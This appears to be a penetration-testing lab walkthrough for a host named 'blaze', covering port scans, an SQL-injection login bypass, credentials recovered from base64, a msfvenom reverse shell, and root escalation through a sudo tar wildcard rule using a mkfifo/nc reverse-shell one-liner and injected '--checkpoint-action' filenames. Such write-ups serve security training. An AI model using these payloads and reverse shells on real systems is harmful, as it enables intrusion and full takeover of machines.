## INFORMATION GATHERING
```bash
# IP ADDRESS
192.168.153.10
# HOSTNAME
blaze                                 
# OPERATING SYSTEM
Ubuntu 20.04.6 LTS                    //From https://192.168.153.10:9090/

# CREDENTIALS  
james:canttouchhhthiss@455152               
cameron:thisscanttbetouchedd@455152
```
## OPEN PORTS DETAILS
```bash
22/tcp   open  ssh             syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
- OpenSSH 8.2p1 Ubuntu 4ubuntu0.5


80/tcp   open  http            syn-ack ttl 61 Apache httpd 2.4.41 ((Ubuntu))
- Web Server 
	- Apache httpd 2.4.41

9090/tcp open  ssl/zeus-admin? syn-ack ttl 61
	- Ubuntu 20.04.6 LTS

```
# ENUMERATION
```bash
# Port 80
80/tcp   open  http            syn-ack ttl 61 Apache httpd 2.4.41 ((Ubuntu))
- Fuzzing Files
sudo ffuf -c  -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -of md -o fuzz/ffuf-raft-large-files -fc 403,404 -u $url/FUZZ
login.php               [Status: 200, Size: 769, Words: 69, Lines: 29, Duration: 72ms]
index.html              [Status: 200, Size: 3349, Words: 971, Lines: 79, Duration: 38ms]
logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 40ms]
db_config.php           [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 38ms]
blocked.html            [Status: 200, Size: 233, Words: 31, Lines: 11, Duration: 39ms]

- Found login page http://192.168.153.10/login.php
- found name JDgodd
- Trying SQLi to login bypass 
- Payload used on username and password
'OR 1=1#


- Found creds Username and Password
james: Y2FudHRvdWNoaGh0aGlzc0A0NTUxNTI=
cameron: dGhpc3NjYW50dGJldG91Y2hlZGRANDU1MTUy
- Base64 decoded creds
james:canttouchhhthiss@455152
cameron:thisscanttbetouchedd@455152


# Port 9090
9090/tcp open  ssl/zeus-admin? syn-ack ttl 61
- whatweb 
	- Cookies[cockpit]
	- HttpOnly[cockpit]
- Using creds james:canttouchhhthiss@455152 able to login


# Port 22
22/tcp   open  ssh             syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
```
## INITIAL FOOTHOLD
```bash
# Using creds james:canttouchhhthiss@455152 able to login
- Found web shell of user james
https://192.168.153.10:9090/system/terminal

# Proper shell
sudo msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.203 LPORT=80 -f elf -o shell.elf
sudo python3 -m http.server 80
- From https://192.168.153.10:9090/system/terminal webshell
^C

sudo nc -nvlp 80
james@blaze:/tmp$ chmod +x shell.elf 
james@blaze:/tmp$ ./shell.elf &
```
## PRIVILEGE ESCALATION
```bash
james@blaze:/tmp$ sudo -l
Matching Defaults entries for james on blaze:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on blaze:
    (ALL) NOPASSWD: /usr/bin/tar -czvf /tmp/backup.tar.gz *

# Reference
https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/
echo "mkfifo /tmp/lhennp; nc 192.168.45.203 80 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1

sudo nc -nvlp 80
sudo /usr/bin/tar -czvf /tmp/backup.tar.gz *

# root
```
# ENUMERATION OUTPUTS
## NMAP
```bash
PORT     STATE SERVICE         REASON         VERSION
22/tcp   open  ssh             syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCmPOfERLKCxx+ufQz7eRTNuEEkJ+GX/hKPNPpCWlTiTgegmjYoXQ7MA5ibTRoJ6vxpPEggzNszJKbBrSVAbRuT2sBg4o7ywiGUy7vsDBpObMrBMsdKuue3gpkaNF8DL2pB3v/XAxtavq1Mh4vz4yj99cc2pX1GhSjpQTWlsK8Rl9DmBKp7t0XxEWwq3juQ9JiN5yAttMrbTDjwMNxcipsYv0pMudDBE6g4gQyiZGwuUfBn+HirxnfRr7KkxmBaEpZgukXSJ7fXYgpQVgNP2cvd2sy/PYe0kL7lOfYwG/DSLWV917RPIdsPPQYr+rqrBL7XQA2Qll30Ms9iAX1m9S6pT/vkaw6JQCgDwFSwPXrknf627jCS7vQ8mh8UL07nPO7Hkko3fnHIcxyJggi/BoAAi3GseOl7vCZl28+waWlNdbR8gaiZhDR1rLvimcm3pg3nv9m+0qfVRIs9fxq97cOEFeXhaGHXvQL6LYGK14ZG+jVXtPavID6txymiBOUsj8M=
|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAweAzke7+zPt3Untb06RlI4MEp+vsEJICUG+0GgPMp+vxOdxEhcsVY0VGyuC+plTRlqNi0zNv1Y0Jj0BYRMSUw=
|   256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPJP5z2Scxa02tfhI1SClflg5QtVdhMImHwY7GugVtfY

80/tcp   open  http            syn-ack ttl 61 Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: blaze
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD

9090/tcp open  ssl/zeus-admin? syn-ack ttl 61
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 400 Bad request
|     Content-Type: text/html; charset=utf8
|     Transfer-Encoding: chunked
|     X-DNS-Prefetch-Control: off
|     Referrer-Policy: no-referrer
|     X-Content-Type-Options: nosniff
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>
|     request
|     </title>
|     <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <style>
|     body {
|     margin: 0;
|     font-family: "RedHatDisplay", "Open Sans", Helvetica, Arial, sans-serif;
|     font-size: 12px;
|     line-height: 1.66666667;
|     color: #333333;
|     background-color: #f5f5f5;
|     border: 0;
|     vertical-align: middle;
|     font-weight: 300;
|     margin: 0 0 10px;
|_    @font-face {
| ssl-cert: Subject: commonName=blaze/organizationName=d2737565435f491e97f49bb5b34ba02e
| Subject Alternative Name: IP Address:127.0.0.1, DNS:localhost
| Issuer: commonName=blaze/organizationName=d2737565435f491e97f49bb5b34ba02e
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-11-16T09:24:06
| Not valid after:  2124-10-23T09:24:06
| MD5:   9fd8:da12:b4cd:bf32:f1c4:ecf3:7c19:5751
| SHA-1: b37d:6061:ee55:ac58:f015:8786:2d5e:831b:2fd4:b1ee
| -----BEGIN CERTIFICATE-----
| MIIDJDCCAgygAwIBAgIUGnQMUGzFxz9u1YckarRbfEyEFa4wDQYJKoZIhvcNAQEL
| BQAwOzEpMCcGA1UECgwgZDI3Mzc1NjU0MzVmNDkxZTk3ZjQ5YmI1YjM0YmEwMmUx
| DjAMBgNVBAMMBWJsYXplMCAXDTI0MTExNjA5MjQwNloYDzIxMjQxMDIzMDkyNDA2
| WjA7MSkwJwYDVQQKDCBkMjczNzU2NTQzNWY0OTFlOTdmNDliYjViMzRiYTAyZTEO
| MAwGA1UEAwwFYmxhemUwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCU
| T2kDdTiDV1RIkIhDcl0bPP2P0wm3el1CxvbTEq450ozvSyqfODEiWCVny/P/4IZE
| LnTUjskb1Qtic2eMNUmrZ7hMgmy7r0g3/o8foOFfx3UbA0fZu6T/jLKDzfwy2FvL
| PwVhyfLEs/d2278apxA8uQXw6Gu6oYU+VLpbDMtwfVrp55cMD+f46UVXG1HBMv6j
| m35KSJK6ZVImb5Uun1+j+j0dZlCDXx0RRGVU4R90QJfOF1IWWi8Ry6b7Z9P2/27p
| 58lcLrWz7M0E6EhC3Ll6TfG/stHseDA/lvDoGCTpq8Te+DUW8yd0l8XUe76BS/1S
| aOFatAR+T66JokORzGGXAgMBAAGjHjAcMBoGA1UdEQQTMBGHBH8AAAGCCWxvY2Fs
| aG9zdDANBgkqhkiG9w0BAQsFAAOCAQEAOPaxz6jvXCYw+odiY7/925cNiMCr518P
| fg48HJncjpPJuo4oZbn8HmZtE2dMuVBwBS7SPgN8XKhEjAeMBxERBpEkHVEPVbwP
| IzjsD2IPKKkekzV5qVrBxSxqIuY62w3gJ0X/5iYmdf58979SL1uDQMQZ50wIfIHY
| sHhQq8Zyy1+ptR7fG45AwmPditmTMArcKaraom+MKBTeKvKYMbIqcpoMdtfvCJm/
| yBHWL3dQrM2iLzk4K0Hj3LtFmeNmg5MyGZXEpQVhdnJvLegGHFQknY1YB/U+ceM7
| F5qwoAQ/iRGSR7t9w3vvXb4ehiZimxtkR3x51w1X3TrhWSk3q+iNIQ==
|_-----END CERTIFICATE-----
```

